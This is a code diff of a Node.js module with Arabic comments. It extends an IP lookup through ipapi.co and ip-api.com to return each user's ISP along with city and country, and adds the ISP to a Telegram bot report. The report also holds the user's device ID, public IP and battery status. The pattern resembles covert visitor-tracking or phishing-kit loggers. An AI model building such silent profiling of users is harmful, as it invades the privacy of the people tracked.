@@ -5,37 +5,51 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 /**
- * دالة جلب المدينة والدولة احترافياً عبر الـ IP الخارجي من السيرفر
+ * دالة جلب المدينة والدولة واقتفاء الشبكة (ISP) عبر الـ IP الخارجي من السيرفر
  * @param {string} ip - IP الخاص بالمستخدم
- * @returns {Promise<string>} - النص المنسق للمدينة والدولة
+ * @returns {Promise<{location: string, isp: string}>} - النص المنسق للموقع والشبكة
  */
-async function fetchLocationByIP(ip) {
+async function fetchNetworkDetailsByIP(ip) {
+  const result = {
+    location: "غير معروف",
+    isp: "غير معروف"
+  };
+
   if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1") {
-    return "غير متوفر (شبكة محليّة)";
+    result.location = "غير متوفر (شبكة محليّة)";
+    result.isp = "شبكة محليّة (Localhost)";
+    return result;
   }
 
   const cleanIp = String(ip).split(",")[0].trim();
 
+  // 1. المحاولة عبر ipapi.co (جلب المدينة، الدولة، والـ Registered ISP)
   try {
-    const res = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city`, { timeout: 3000 });
-    if (res.data && res.data.status === "success") {
+    const res = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
+    if (res.data) {
       const city = res.data.city || "غير معروفة";
-      const country = res.data.country || "غير معروفة";
-      return `${city}، ${country}`;
+      const country = res.data.country_name || "غير معروفة";
+      result.location = `${city}، ${country}`;
+      result.isp = res.data.org || res.data.asn || "غير معروف";
+      return result;
     }
   } catch (e) {
-    // المحاولة عبر مصدر احتياطي في حال فشل المصدر الأول
+    // 2. المحاولة عبر مصدر احتياطي (ip-api.com) في حال فشل API الأول
     try {
-      const fallbackRes = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
-      if (fallbackRes.data && fallbackRes.data.city) {
-        return `${fallbackRes.data.city}، ${fallbackRes.data.country_name}`;
+      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org`, { timeout: 3000 });
+      if (fallbackRes.data && fallbackRes.data.status === "success") {
+        const city = fallbackRes.data.city || "غير معروفة";
+        const country = fallbackRes.data.country || "غير معروفة";
+        result.location = `${city}، ${country}`;
+        result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
+        return result;
       }
     } catch (fallbackErr) {
-      console.warn("⚠️ تعذر جلب الموقع الجغرافي للـ IP:", cleanIp);
+      console.warn("⚠️ تعذر جلب تفاصيل الموقع والشبكة للـ IP:", cleanIp);
     }
   }
 
-  return "غير معروف";
+  return result;
 }
 
 /**
@@ -83,10 +97,14 @@ async function sendTelegramMessage(data, isInitial = true) {
       const clientID = data.clientID || data.clientId || "غير متوفر";
       const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "غير متوفر";
 
-      // معالجة جلب المدينة والدولة تلقائياً من الـ IP الخارجي
-      let locationText = data.city && data.country ? `${data.city}، ${data.country}` : null;
-      if (!locationText || locationText.includes("غير معروف")) {
-        locationText = await fetchLocationByIP(publicIP);
+      // معالجة جلب المدينة والدولة والشبكة من السيرفر
+      let locationText = data.geoCity && data.geoCountry ? `${data.geoCity}، ${data.geoCountry}` : null;
+      let ispText = data.ispProvider || data.isp || null;
+
+      if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف") {
+        const netInfo = await fetchNetworkDetailsByIP(publicIP);
+        if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
+        if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
       }
 
       // مواصفات الجهاز والبيئة
@@ -120,6 +138,7 @@ async function sendTelegramMessage(data, isInitial = true) {
       message += `\n🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                  `🌍 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
                  `🏙 <b>المدينة والدولة:</b> <b>${locationText}</b>\n` +
+                 `📡 <b>الشبكة / المزود (ISP):</b> <b>${ispText}</b>\n` +
                  `———————————————\n` +
                  `📅 <b>تاريخ الإرسال:</b> ${dateTimeStr}\n` +
                  `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
